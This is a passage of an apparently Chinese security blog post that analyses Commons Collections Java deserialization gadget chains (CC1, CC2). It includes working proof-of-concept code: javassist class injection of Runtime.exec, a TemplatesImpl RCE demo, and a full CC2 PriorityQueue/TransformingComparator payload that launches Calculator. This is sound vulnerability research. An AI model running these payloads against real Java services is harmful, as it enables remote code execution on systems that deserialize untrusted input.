ByteArrayInputStream(bos.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x4E09;&#x4E2A;&#x5173;&#x952E;&#x70B9;&#xFF1A;<code>this.memberValues</code>&#x3001;<code>invoke</code> &#x548C; <code>this.memberValues.entrySet()</code></p>
<p>&#x9996;&#x5148; <code>this.memberValues</code> &#x5728;&#x7B2C;&#x4E00;&#x4E2A;<code>InvocationHandler</code> &#x5BF9;&#x8C61;&#x4E2D;&#x88AB;&#x8BBE;&#x7F6E;&#x6210;&#x4E86;&#x6784;&#x9020;&#x597D;&#x7684; LazyMap&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x8C03;&#x7528;&#x5176; get &#x65B9;&#x6CD5;&#x5373;&#x53EF; RCE</p>
<p>&#x5176;&#x6B21;&#x52A8;&#x6001;&#x4EE3;&#x7406;&#x4E2D;&#xFF0C;&#x8C03;&#x7528;&#x52A8;&#x6001;&#x7684;&#x4EE3;&#x7406;&#x5BF9;&#x8C61;&#x4EFB;&#x4F55;&#x65B9;&#x6CD5;&#xFF0C;&#x5747;&#x4F1A;&#x89E6;&#x53D1;&#x4E4B;&#x524D; <code>InvocationHandler</code> &#x5BF9;&#x8C61;&#x7684; <code>invoke</code> &#x65B9;&#x6CD5;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210210185346055.png" alt></p>
<p>&#x6700;&#x540E;  <code>AnnotationInvocationHandler#invoke</code> &#x4E2D;&#x8C03;&#x7528;&#x4E86; <code>get</code></p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210210184040076.png" alt></p>
<p>&#x5229;&#x7528;&#x94FE;</p>
<p></p><figure class="highlight plain hljs"><table><tbody><tr><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">	ObjectInputStream.readObject()</span><br><span class="line">		AnnotationInvocationHandler.readObject()</span><br><span class="line">			Map(Proxy).entrySet()</span><br><span class="line">				AnnotationInvocationHandler.invoke()</span><br><span class="line">					LazyMap.get()</span><br><span class="line">						ChainedTransformer.transform()</span><br><span class="line">							ConstantTransformer.transform()</span><br><span class="line">							InvokerTransformer.transform()</span><br><span class="line">								Method.invoke()</span><br><span class="line">									Class.getMethod()</span><br><span class="line">							InvokerTransformer.transform()</span><br><span class="line">								Method.invoke()</span><br><span class="line">									Runtime.getRuntime()</span><br><span class="line">							InvokerTransformer.transform()</span><br><span class="line">								Method.invoke()</span><br><span class="line">									Runtime.exec()</span><br></pre></td></tr></tbody></table></figure><p></p>
<h1 id="CommonsCollections2"><a href="#CommonsCollections2" class="headerlink" title="CommonsCollections2"></a>CommonsCollections2</h1><h2 id="Basics-1"><a href="#Basics-1" class="headerlink" title="Basics"></a>Basics</h2><p>javassist &#x52A8;&#x6001;&#x7F16;&#x7A0B;&#x4E3B;&#x8981;&#x662F;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x52A8;&#x6001;&#x7684;&#x751F;&#x6210; Java &#x4EE3;&#x7801;</p>
<p>Demo &#x4EE3;&#x7801;&#x76F4;&#x63A5;&#x5F15;&#x7528; @p1g3 &#x5E08;&#x5085;&#x7684;&#xFF0C;&#x4ECE;&#x521B;&#x5EFA;&#x7C7B;&#x5230;&#x521B;&#x5EFA;&#x6784;&#x9020;&#x65B9;&#x6CD5;&#x90FD;&#x6709;</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JavassistDemo</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">createPseson</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>{</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">// 1. &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x7A7A;&#x7C7B;</span></span><br><span class="line">        CtClass cc = pool.makeClass(<span class="hljs-string">&quot;Person&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">// 2. &#x65B0;&#x589E;&#x4E00;&#x4E2A;&#x5B57;&#x6BB5; private String name;</span></span><br><span class="line">        <span class="hljs-comment">// &#x5B57;&#x6BB5;&#x540D;&#x4E3A;name</span></span><br><span class="line">        CtField param = <span class="hljs-keyword">new</span> CtField(pool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>), <span class="hljs-string">&quot;name&quot;</span>, cc);</span><br><span class="line">        <span class="hljs-comment">// &#x8BBF;&#x95EE;&#x7EA7;&#x522B;&#x662F; private</span></span><br><span class="line">        param.setModifiers(Modifier.PRIVATE);</span><br><span class="line">        <span class="hljs-comment">// &#x521D;&#x59CB;&#x503C;&#x662F; &quot;xiaoming&quot;</span></span><br><span class="line">        cc.addField(param, CtField.Initializer.constant(<span class="hljs-string">&quot;xiaoming&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">// 3. &#x751F;&#x6210; getter&#x3001;setter &#x65B9;&#x6CD5;</span></span><br><span class="line">        cc.addMethod(CtNewMethod.setter(<span class="hljs-string">&quot;setName&quot;</span>, param));</span><br><span class="line">        cc.addMethod(CtNewMethod.getter(<span class="hljs-string">&quot;getName&quot;</span>, param));</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">// 4. &#x6DFB;&#x52A0;&#x65E0;&#x53C2;&#x7684;&#x6784;&#x9020;&#x51FD;&#x6570;</span></span><br><span class="line">        CtConstructor cons = <span class="hljs-keyword">new</span> CtConstructor(<span class="hljs-keyword">new</span> CtClass[]{}, cc);</span><br><span class="line">        cons.setBody(<span class="hljs-string">&quot;{name = \&quot;xiaohong\&quot;;}&quot;</span>);</span><br><span class="line">        cc.addConstructor(cons);</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">// 5. &#x6DFB;&#x52A0;&#x6709;&#x53C2;&#x7684;&#x6784;&#x9020;&#x51FD;&#x6570;</span></span><br><span class="line">        cons = <span class="hljs-keyword">new</span> CtConstructor(<span class="hljs-keyword">new</span> CtClass[]{pool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>)}, cc);</span><br><span class="line">        <span class="hljs-comment">// $0=this / $1,$2,$3... &#x4EE3;&#x8868;&#x65B9;&#x6CD5;&#x53C2;&#x6570;</span></span><br><span class="line">        cons.setBody(<span class="hljs-string">&quot;{$0.name = $1;}&quot;</span>);</span><br><span class="line">        cc.addConstructor(cons);</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">// 6. &#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x540D;&#x4E3A;printName&#x65B9;&#x6CD5;&#xFF0C;&#x65E0;&#x53C2;&#x6570;&#xFF0C;&#x65E0;&#x8FD4;&#x56DE;&#x503C;&#xFF0C;&#x8F93;&#x51FA;name&#x503C;</span></span><br><span class="line">        CtMethod ctMethod = <span class="hljs-keyword">new</span> CtMethod(CtClass.voidType, <span class="hljs-string">&quot;printName&quot;</span>, <span class="hljs-keyword">new</span> CtClass[]{}, cc);</span><br><span class="line">        ctMethod.setModifiers(Modifier.PUBLIC);</span><br><span class="line">        ctMethod.setBody(<span class="hljs-string">&quot;{System.out.println(name);}&quot;</span>);</span><br><span class="line">        cc.addMethod(ctMethod);</span><br><span class="line"></span><br><span class="line">        <span class="hljs-comment">//&#x8FD9;&#x91CC;&#x4F1A;&#x5C06;&#x8FD9;&#x4E2A;&#x521B;&#x5EFA;&#x7684;&#x7C7B;&#x5BF9;&#x8C61;&#x7F16;&#x8BD1;&#x4E3A;.class&#x6587;&#x4EF6;</span></span><br><span class="line">        cc.writeFile(<span class="hljs-string">&quot;./&quot;</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>{</span><br><span class="line">        <span class="hljs-keyword">try</span> {</span><br><span class="line">            createPseson();</span><br><span class="line">        } <span class="hljs-keyword">catch</span> (Exception e) {</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x53CD;&#x7F16;&#x8BD1;&#x4E00;&#x4E0B; Person.class &#x53EF;&#x4EE5;&#x770B;&#x5230;&#x6700;&#x7EC8;&#x6784;&#x9020;&#x51FA;&#x6765;&#x7684;&#x4EE3;&#x7801;&#x662F;&#x8FD9;&#x6837;&#x7684;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210211145943465.png" alt></p>
<p>javassist &#x5E26;&#x6765;&#x7684;&#x653B;&#x51FB;&#x9762;&#x5728;&#x4E8E; Java &#x8FDB;&#x884C;&#x5B9E;&#x4F8B;&#x5316;&#x5BF9;&#x8C61;&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x8C03;&#x7528; static &#x4EE3;&#x7801;&#x5757;</p>
<p>&#x521B;&#x5EFA;&#x4E00;&#x4E2A; class</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JDemo</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, CannotCompileException, NotFoundException </span>{</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        CtClass cc = pool.makeClass(<span class="hljs-string">&quot;TestDemo&quot;</span>);</span><br><span class="line">        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;/Applications/Calculator.app/Contents/MacOS/Calculator\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        cc.writeFile();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210213022249941.png" alt></p>
<p>&#x63A5;&#x4E0B;&#x6765;&#x5229;&#x7528; TemplatesImpl &#x6765;&#x66F4;&#x8FDB;&#x4E00;&#x6B65;</p>
<p><code>TemplatesImpl#newTransformer</code> &#x8C03;&#x7528;&#x4E86; <code>getTransletInstance</code></p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210213133100734.png" alt></p>
<p>&#x5148;&#x770B;&#x7B2C;&#x4E00;&#x90E8;&#x5206;&#xFF0C;&#x5982;&#x679C;  <code>_name</code> &#x4E0D;&#x4E3A;null&#x7684;&#x503C;&#xFF0C;<code>_class</code>&#x8BBE;&#x7F6E;&#x4E3A; null&#xFF0C;&#x8FD9;&#x6837;&#x4F1A;&#x8C03;&#x7528; <code>defineTransletClases</code></p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210213133539904.png" alt></p>
<p>&#x8DDF;&#x8FDB;  <code>defineTransletClases</code>&#xFF0C;&#x6CE8;&#x610F;&#x51E0;&#x4E2A;&#x95EE;&#x9898;</p>
<p><code>_class[i] = loader.defineClass(_bytecodes[i]);</code> &#x5BF9; byte &#x8FDB;&#x884C;&#x4E86;&#x8FD8;&#x539F;</p>
<p>&#x9700;&#x8981;&#x8BBE;&#x7F6E;&#x7236;&#x7C7B;&#x4E3A; <code>AbstractTranslet</code> &#xFF0C;&#x9ED8;&#x8BA4;&#x72B6;&#x6001;&#x4E0B;<code>_transletIndex</code> &#x7684;&#x503C;&#x4E3A; -1&#xFF0C;&#x5982;&#x679C;&#x8FDB;&#x5165;&#x8FD9;&#x4E2A; if &#x6BD4;&#x8F83;&#x540E;&#xFF0C;&#x4F1A;&#x7ED9;<code>_transletIndex</code> &#x9644;&#x503C;&#x81F3;&#x5C11;&#x4E3A; 0&#xFF0C;&#x4E0D;&#x7136;&#x4F1A;&#x629B;&#x51FA;&#x5F02;&#x5E38;&#x3002;&#x8FD9;&#x91CC;&#x6211;&#x4EEC;&#x4E5F;&#x4E0D;&#x80FD;&#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x7684;&#x65B9;&#x5F0F;&#x6765;&#x8BBE;&#x7F6E;<code>_transletIndex</code>&#x7684;&#x503C;&#xFF0C;&#x56E0;&#x4E3A;&#x8FD8;&#x662F;&#x4F1A;&#x8FDB;&#x5165;&#x5230;<code>_auxClasses</code> &#x65B9;&#x6CD5;&#x4E2D;&#xFF0C;&#x6B64;&#x65B9;&#x6CD5;&#x4F1A;&#x62A5;&#x51FA;&#x9519;&#x8BEF;&#xFF0C;&#x65E0;&#x6CD5;&#x6B63;&#x5E38;&#x7684;&#x5E8F;&#x5217;&#x5316;&#x3002;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210213133950227.png" alt></p>
<p>&#x56DE;&#x5230; <code>TemplatesImpl#getTransletInstance</code> &#x7684;&#x7B2C;&#x4E8C;&#x90E8;&#x5206;&#xFF0C;&#x8FD9;&#x91CC;&#x8FDB;&#x884C;&#x4E86;&#x5B9E;&#x4F8B;&#x5316;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8FD9;&#x91CC;&#x4F1A;&#x8C03;&#x7528;&#x6211;&#x4EEC; static &#x4EE3;&#x7801;&#x5757;&#x7684;&#x4EE3;&#x7801;</p>
<p>&#x6784;&#x9020;&#x8C03;&#x7528; <code>TemplatesImpl#newTransformer</code> &#x7ED3;&#x5408; javassist &#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x4E00;&#x4E2A; RCE &#x7684; demo</p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JDemo</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>{</span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));</span><br><span class="line">        CtClass cc = pool.makeClass(<span class="hljs-string">&quot;TestDemo&quot;</span>);</span><br><span class="line">        String cmd = <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;/Applications/Calculator.app/Contents/MacOS/Calculator\&quot;);&quot;</span>;</span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="hljs-keyword">byte</span>[] classBytes = cc.toBytecode();</span><br><span class="line">        <span class="hljs-keyword">byte</span>[][] targetByteCodes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]{classBytes};</span><br><span class="line">        TemplatesImpl templates = TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, targetByteCodes);</span><br><span class="line">        <span class="hljs-comment">// &#x8FDB;&#x5165; defineTransletClasses() &#x65B9;&#x6CD5;&#x9700;&#x8981;&#x7684;&#x6761;&#x4EF6;</span></span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;TestDemo&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_class&quot;</span>, <span class="hljs-keyword">null</span>);</span><br><span class="line">        <span class="hljs-comment">// &#x56E0;&#x4E3A;&#x4EE3;&#x7801;&#x4E2D;&#x5B58;&#x5728; _tfactory.getExternalExtensionsMap() &#x6240;&#x4EE5;&#x9700;&#x8981; _tfactory &#x8FDB;&#x884C;&#x8D4B;&#x503C; &#x4E0D;&#x80FD;&#x4E3A;null&#xFF0C;&#x8FD9;&#x91CC;&#x4E0E; JDK &#x7248;&#x672C;&#x6709;&#x5173;</span></span><br><span class="line">        setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> TransformerFactoryImpl());</span><br><span class="line">        templates.newTransformer();</span><br><span class="line"></span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Object obj, <span class="hljs-keyword">final</span> String fieldName, <span class="hljs-keyword">final</span> Object value)</span> <span class="hljs-keyword">throws</span> Exception </span>{</span><br><span class="line">        <span class="hljs-keyword">final</span> Field field = getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title">getField</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Class&lt;?&gt; clazz, <span class="hljs-keyword">final</span> String fieldName)</span> </span>{</span><br><span class="line">        Field field = <span class="hljs-keyword">null</span>;</span><br><span class="line">        <span class="hljs-keyword">try</span> {</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">catch</span> (NoSuchFieldException ex) {</span><br><span class="line">            <span class="hljs-keyword">if</span> (clazz.getSuperclass() != <span class="hljs-keyword">null</span>) {</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="hljs-keyword">return</span> field;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<h2 id="Gadget-chain"><a href="#Gadget-chain" class="headerlink" title="Gadget chain"></a>Gadget chain</h2><p>&#x6CBF;&#x7528;&#x4E4B;&#x524D; CC1 &#x7684;&#x601D;&#x8DEF;&#xFF0C;&#x76EE;&#x524D;&#x7684;&#x6838;&#x5FC3;&#x76EE;&#x7684;&#x662F;&#x5BFB;&#x627E;&#x8C03;&#x7528; ChainedTransformer &#x7684; <code>transform</code> &#x7684;&#x7C7B;</p>
<p>&#x770B;&#x4E00;&#x4E0B; <code>TransformingComparator#compare</code> ,&#x5728;&#x4E0A;&#x9762;&#x6784;&#x9020;&#x51FD;&#x6570;&#x5B9E;&#x4F8B;&#x5316;&#x5BF9;&#x8C61;&#x7684;&#x65F6;&#x5019;&#x7ED9; <code>this.transformer</code> &#x9644;&#x503C;&#x4E3A;&#x4F20;&#x5165;&#x7684; transformer&#xFF0C;&#x8FD9;&#x91CC;&#x76F4;&#x63A5;&#x8C03;&#x7528; transform &#x65B9;&#x6CD5;&#xFF0C;&#x7B26;&#x5408;&#x6211;&#x4EEC;&#x7684;&#x6784;&#x9020;&#x6761;&#x4EF6;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212220401768.png" alt></p>
<p>&#x7531;&#x6B64;&#x6211;&#x4EEC;&#x540E;&#x7EED;&#x76EE;&#x7684;&#x5C31;&#x662F;&#x5BFB;&#x627E;&#x8C03;&#x7528;&#x4E86;&#x8FD9;&#x4E2A;&#x65B9;&#x6CD5;&#x7684;&#x3002;&#x5229;&#x7528;&#x94FE;&#x6BD4;&#x8F83;&#x590D;&#x6742;&#xFF0C;&#x6211;&#x4EEC;&#x5207;&#x6362;&#x5230;&#x6B63;&#x5411;&#x7684;&#x601D;&#x8DEF;</p>
<p><code>PriorityQueue#readObject</code> &#xFF0C;&#x6700;&#x540E;&#x4E00;&#x884C;&#x8C03;&#x7528;&#x4E86; <code>heapify</code> &#x65B9;&#x6CD5;</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212220910736.png" alt></p>
<p><code>PriorityQueue#heapify</code> &#x91CC;&#x8C03;&#x7528;&#x4E86; <code>siftDown</code> &#xFF0C;&#x4F46;&#x662F;&#x8FD9;&#x91CC;&#x6709;&#x4E2A;&#x6761;&#x4EF6;&#x5C31;&#x662F;&#x8981;&#x6EE1;&#x8DB3; <code>int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0</code>&#x3002;&#x8FD9;&#x91CC; size &#x5982;&#x679C;&#x4E3A; 1 &#x7684;&#x8BDD;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x6211;&#x4EEC;&#x53EA;&#x7ED9; PriorityQueue add &#x4E00;&#x4E2A;&#x503C;&#x7684;&#x65F6;&#x5019;&#xFF0C; <code>(size &gt;&gt;&gt; 1) - 1</code> &#x7B97;&#x51FA;&#x6765;&#x4E3A; -1&#xFF0C;&#x5982;&#x679C;&#x60F3;&#x8BA9;&#x5176;&#x6EE1;&#x8DB3; for &#x5FAA;&#x73AF;&#x8868;&#x8FBE;&#x5F0F;&#xFF0C;size &#x81F3;&#x5C11;&#x4E3A; 2</p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212221022010.png" alt></p>
<p>&#x770B;&#x4E00;&#x4E0B; <code>PriorityQueue#siftDown</code></p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212222808177.png" alt></p>
<p>&#x968F;&#x540E;&#x8C03;&#x7528;&#x5230;&#x5173;&#x952E;&#x7684;&#x65B9;&#x6CD5; <code>PriorityQueue#siftDownUsingComparator</code> </p>
<p><img src="/2021/02/13/Commons-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20210212222905993.png" alt></p>
<p>&#x5728;&#x6F2B;&#x957F;&#x7684;&#x8C03;&#x7528;&#x6808;&#x4E2D;&#xFF0C;&#x6700;&#x91CD;&#x8981;&#x7684;&#x53C2;&#x6570;&#x5C31;&#x662F; comparator&#x3002;&#x53EF;&#x63A7;&#x6211;&#x4EEC;&#x5373;&#x53EF; RCE</p>
<p>&#x4F18;&#x5316; payload &#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x7F51;&#x4E0A;&#x5F88;&#x591A;&#x6587;&#x7AE0;&#x90FD;&#x4F1A;&#x7528;&#x53CD;&#x5C04;&#x53BB;&#x9644;&#x503C;&#xFF0C;&#x5176;&#x5B9E; PriorityQueue &#x521D;&#x59CB;&#x5316;&#x7684;&#x65F6;&#x5019;&#x4E5F;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x9644;&#x503C;&#xFF0C;&#x4F46;&#x662F;&#x4F1A;&#x89E6;&#x53D1;&#x591A;&#x6B21; payload&#x3002;</p>
<p><strong>fake CC2 payload</strong></p>
<p></p><figure class="highlight java hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC2</span> </span>{</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException,</span></span><br><span class="line"><span class="hljs-function">            InstantiationException, NoSuchFieldException, IOException </span>{</span><br><span class="line">        Transformer[] realPoc  = <span class="hljs-keyword">new</span> Transformer[]{</span><br><span class="line">                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class, Class[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{Object.class, Object[].class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]}),</span><br><span class="line">                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="hljs-keyword">new</span> Class[]{String.class},</span><br><span class="line">                        <span class="hljs-keyword">new</span> Object[]{ (<span class="hljs-string">&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>)})};</span><br><span class="line">        ChainedTransformer fakeChain = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]{ <span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-string">&quot;random&quot;</span>)});</span><br><span class="line"></span><br><span class="line">        TransformingComparator comparator = <span class="hljs-keyword">new</span> TransformingComparator(fakeChain);</span><br><span class="line">        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">1</span>);</span><br><span class="line">        queue.add(<span class="hljs-number">1</span>);</span><br><span class="line">        queue.add(<span class="hljs-number">2</span>);</span><br><span class="line">        Field field = Class.forName(<span class="hljs-string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        field.set(queue, comparator);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Field f = ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="hljs-keyword">true</span>);</span><br><span class="line">        f.set(fakeChain, realPoc);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream bos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(bos);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(bos);</span><br><span class="line">        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> ByteArrayInputStream(bos.toByteArray()));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>CC2 &#x5176;&#x5B9E;&#x6838;&#x5FC3;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x7684;&#x65B9;&#x5F0F;&#x4E0D;&#x662F;&#x9760;&#x7684; ChainedTransformer &#x4E0E; InvokerTransformer &#x7B49;&#x7ED3;&#x5408;&#x7684;&#x65B9;&#x5F0F;&#x3002;&#x5B83;&#x53D8;&#x4E3A;&#x4E86;&#x4F7F;&#x7528; TemplatesImpl &#x8FD9;&#x4E2A;&#x7C7B;&#x6765;&#x8C03;&#x7528;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x524D;&#x6587; basics &#x7684;&#x5185;&#x5BB9;</p>
<p>&#x524D;&#x6587;&#x6211;&#x4EEC;&#x5229;&#x7528; <code>TemplatesImpl#newTransformer</code> &#x7ED3;&#x5408; javassist &#x5B9E;&#x73B0;&#x4E86;&#x4E00;&#x4E2A; RCE demo</p>
<p>&#x63A5;&#x4E0B;&#x6765;&#x6211;&#x4EEC;&#x7684;&#x4EFB;&#x52A1;&#x662F;&#x5982;&#x4F55;&#x8C03;&#x7528; <code>TemplatesImpl#newTransformer</code> &#x4EE5;&#x53CA;&#x5982;&#x4F55;&#x4E0E;readObject &#x7ED3;&#x5408;</p>
